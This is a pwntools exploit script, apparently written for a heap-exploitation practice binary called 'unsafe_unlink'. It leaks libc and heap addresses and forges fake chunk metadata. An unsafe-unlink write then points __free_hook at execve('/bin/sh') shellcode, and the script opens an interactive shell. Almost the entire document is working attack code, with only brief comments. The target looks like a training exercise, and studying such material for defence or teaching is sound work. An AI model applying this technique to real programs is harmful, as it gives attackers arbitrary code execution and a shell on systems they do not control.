#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'

exe = "./unsafe_unlink"
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

gs = '''
init-gef
c
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

index = 0

def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", str(index).encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", str(index).encode())
    io.recvuntil(b"> ")

io = start()

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# Prepare execve("/bin/sh") shellcode with a jmp over where the fd will be written.
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))

chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

#-------overwirte __free_hook with shellcode addr------

# 0x18 = 24 (bk position)
fd = p64(libc.sym.__free_hook - 0x18)

# follow fd to overwrite bk

# shellcode position
bk = p64(heap + 0x20)

prev_size = p64(0x90)
fake_size = p64(0x90)
edit(chunk_A, fd + bk + shellcode + p8(0)*(0x70-len(shellcode)) + prev_size + fake_size)

# consolidate chuck_B woth chunk_A
free(chunk_B)
# execute shellcode
# free(chunk_A)
io.interactive()
